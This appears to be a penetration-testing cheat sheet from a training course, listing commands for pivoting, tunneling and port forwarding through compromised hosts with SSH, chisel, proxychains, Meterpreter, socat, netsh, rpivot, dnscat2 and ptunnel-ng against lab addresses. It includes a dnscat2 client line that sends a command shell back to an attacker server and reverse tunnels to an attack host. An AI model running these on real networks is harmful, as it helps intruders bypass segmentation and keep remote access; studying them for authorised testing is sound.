# Pivoting, Tunneling, Port Forwarding

## **Introduction**

> **Pivoting** is essentially the idea of moving to other networks through a compromised host (pivot host) to find more targets on different network segments. Pivoting's primary use is to defeat segmentation (both physically and virtually) to access an isolated network.\
> **Tunneling** is a subset of pivoting. Tunneling encapsulates network traffic into another protocol and routes traffic through it.\
> **Port forwarding** is a technique that allows us to redirect a communication request from one port to another.

***

## **Initial Enumeration - Finding More Targets**

### **Finding Networks**

| Command                        | Description                                                                                                                                   |
| ------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------- |
| `ifconfig`                     | Linux-based command that displays all current network configurations of a system.                                                             |
| `ipconfig`                     | Windows-based command that displays all system network configurations.                                                                        |
| `netstat -r`                   | Command used to display the routing table for all IPv4-based protocols.                                                                       |
| `netstat -antp`                | Used to display all active network connections with associated process IDs. Useful to identify internal services to enumerate though pivoting |
| `netstat -antb \|findstr 1080` | Windows-based command used to list TCP network connections listening on port 1080.                                                            |

### **Internal Hosts Discovery**

| Command                                                                                   | Description                                                                                 |
| ----------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------- |
| `for i in {1..254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done`              | For Loop used on a Linux-based system to discover devices in a specified network segment.   |
| `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"`                  | For Loop used on a Windows-based system to discover devices in a specified network segment. |
| `1..254 \| % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}` | PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment.       |

***

## **SSH Local Port forwarding**

| Command                                                                   | Description                                                                                                                              |
| ------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| `ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>`                   | SSH comand used to create an SSH tunnel from local port 1234 to a remote target using port 3306.                                         |
| `netstat -antp \| grep 1234`                                              | Netstat option used to display network connections associated with a tunnel created. Using `grep` to filter based on local port `1234` . |
| `nmap -v -sV -p1234 localhost`                                            | Nmap command used to scan a host through a connection that has been made on local port `1234`.                                           |
| `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>` | SSH command that instructs the ssh client to request multiple local port forwarding at the same time.                                    |

***

## **SSH Dynamic Port Forwarding**

| Command                                  | Description                                                                                                                                                |
| ---------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ssh -D 9050 ubuntu@<IPaddressofTarget>` | SSH command used to perform a dynamic port forward on port `9050` and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy. |
| `tail -4 /etc/proxychains.conf`          | Read proxychains.conf to ensure socks configurations are in place.                                                                                         |
| `proxychains nmap -v -sn 172.16.5.1-200` | Send traffic generated by Nmap through Proxychains and a SOCKS proxy.                                                                                      |
| `proxychains msfconsole`                 | Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.                                                          |

***

## **SSH Reverse Port Forwarding**

| Command                                                                       | Description                                                                                                                            |
| ----------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 user@<ipAddressofTarget> -vN` | Reverse SSH tunnel from target host to attack host. Traffic is forwarded on port `8080` on the attack host to port `80` on the target. |

***

## **Chisel Pivoting**

| Command                                       | Description                                                                                   |
| --------------------------------------------- | --------------------------------------------------------------------------------------------- |
| `./chisel server -v -p 1234 --socks5`         | Used to start a chisel server in verbose mode listening on port `1234` using SOCKS version 5. |
| `./chisel client -v 10.129.202.64:1234 socks` | Used to connect to a chisel server at the specified IP address & port using socks.            |
| Add to proxychains: `127.0.0.1 socks5 1080`   | Line to add to `/etc/proxychains.conf` when using chisel                                      |

***

## **ProxyChains Configuration**

> Many tools will require setting up the proxychain configuration in order to function properly.
>
> For example, chisel requires adding the following: `127.0.0.1 socks5 1080`.

| Command                 | Description                                                                                                                                                                |
| ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `socks4 127.0.0.1 9050` | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port. |
| `socks5 127.0.0.1 1080` | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5 proxy is used in combination with proxychains on the specified IP address and port. |

***

## **Meterpreter Pivoting**

| Command                                                                   | Description                                                                                                                                                                                              |
| ------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `msf6 > use post/multi/manage/autoroute`                                  | Metasploit command used to select the autoroute module.                                                                                                                                                  |
| `meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>`        | Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target. |
| `meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>` | Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port `1234` listening on the IP address of the Attack Host.                             |

***

## **Socat Pivoting**

| Command                                                       | Description                                                                                                                               |
| ------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80` | Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.   |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443`   | Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443. |

***

## **Windows PLink Pivoting**

| Command                                    | Description                                                                                                                                                                                                                                                             |
| ------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `plink -D 9050 ubuntu@<IPaddressofTarget>` | Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host. |

***

## **SSHuttle Pivoting**

| Command                                               | Description                                                                                                                                                         |
| ----------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v` | Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network |

***

## Windows NetSh Pivoting

`netsh` is the native way to create a port forward on Windows.

Notice that `netsh` can only be run from `Administrator` users.

| Command                                                                                                                                  | Description                                                                                                |
| ---------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| `netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215`             | Listen on port on the 192.168.50.64 IP on port 2222 and forward packets to the 10.4.50.215  IP on port 22. |
| `netsh interface portproxy show all`                                                                                                     | Check estabilished port forwards                                                                           |
| `netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow` | Allow the previous port foward's traffic from the windows firewall                                         |
| `netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64`                                                       | Delete the previously created port forward                                                                 |

***

## **Rpivot Pivoting**

| Command                                                                        | Description                                                                                                                       |
| ------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------- |
| `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` | Used to run the rpivot server (`server.py`) on proxy port `9050`, server port `9999` and listening on any IP address (`0.0.0.0`). |
| `scp -r rpivot ubuntu@<IPaddressOfTarget>`                                     | Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.                          |
| `sudo git clone https://github.com/klsecservices/rpivot.git`                   | Clones the rpivot project GitHub repository.                                                                                      |
| `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999`               | Used to run the rpivot client (`client.py`) to connect to the specified rpivot server on the appropriate port.                    |

***

## **DNSCat Pivoting**

| Command                                                                                                                        | Description                                                                                                                                                                                      |
| ------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `git clone https://github.com/lukebaggett/dnscat2-powershell.git`                                                              | Clones the dnscat2-powershell project Github repository.                                                                                                                                         |
| `Import-Module dnscat2.ps1`                                                                                                    | PowerShell command used to import the dnscat2.ps1 tool.                                                                                                                                          |
| `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd` | PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (`-Exec cmd`). |
| `dnscat2> ?`                                                                                                                   | Used to list dnscat2 options.                                                                                                                                                                    |
| `dnscat2> window -i 1`                                                                                                         | Used to interact with an established dnscat2 session.                                                                                                                                            |

***

## **PTunnel-NG Pivoting**

| Command                                                         | Description                                                                                             |
| --------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| `git clone https://github.com/utoni/ptunnel-ng.git`             | Clones the ptunnel-ng project GitHub repository.                                                        |
| `sudo ./autogen.sh`                                             | Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.                 |
| `sudo ./ptunnel-ng -r10.129.202.64 -R22`                        | Used to start the ptunnel-ng server on the specified IP address (`-r`) and corresponding port (`-R22`). |
| `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22` | Used to connect to a specified ptunnel-ng server through local port 2222 (`-l2222`).                    |

***

## **Others**

| Command                                                                                                                                                                      | Description                                                                                                                                                                               |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| proxychains firefox-esr :80                                                                                                                                                  | Open firefox with Proxychains and send the web request through a SOCKS proxy server to the specified destination web server.                                                              |
| python client.py --server-ip TargetIP --server-port 8080 --ntlm-proxy-ip ProxyIP --ntlm-proxy-port 8081 --domain nameofWindowsDomain --username username --password password | Run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.                                                                                       |
| netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25                                             | Windows-based command that uses `netsh.exe` to configure a portproxy rule called `v4tov4` that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389. |
| netsh.exe interface portproxy show v4tov4\`                                                                                                                                  | Windows-based command used to view the configurations of a portproxy rule called v4tov4.                                                                                                  |
| sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache                                                                                    | Used to start the dnscat2.rb server running on the specified IP address, port (`53`) & using the domain `inlanefreight.local` with the no-cache option enabled.                           |
